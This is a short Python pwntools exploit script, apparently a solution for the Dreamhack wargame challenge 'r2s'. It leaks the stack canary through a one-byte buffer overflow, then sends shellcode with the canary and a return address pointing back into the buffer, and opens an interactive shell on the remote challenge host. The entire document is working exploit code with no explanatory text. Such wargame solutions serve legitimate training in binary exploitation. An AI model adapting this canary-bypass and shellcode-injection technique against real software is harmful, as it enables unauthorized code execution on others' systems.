from pwn import *

p = remote("host1.dreamhack.games", 12209)
context(arch='amd64', os='linux')
elf = ELF("./r2s")
#context.log_level = 'debug'

def slog(n, m): return success(': '.join([n, hex(m)]))

shellcode = asm(shellcraft.sh())

p.recvuntil(b'Address of the buf: ')
bufferAddress = int(p.recvline().strip().decode(), 16)

p.recvuntil(b'$rbp: ')
distanceFromRbp = int(p.recvline().strip().decode(), 16)
print(distanceFromRbp)

payload = b'A'*(0x60 - 0x8 + 0x1)
p.sendafter("Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recv(7))
slog('Canary', canary)

payload2 = shellcode.ljust(0x58, b'A') + p64(canary) + b'B'*0x8 + p64(bufferAddress)
p.sendlineafter(b'Input: ', payload2)
p.interactive()
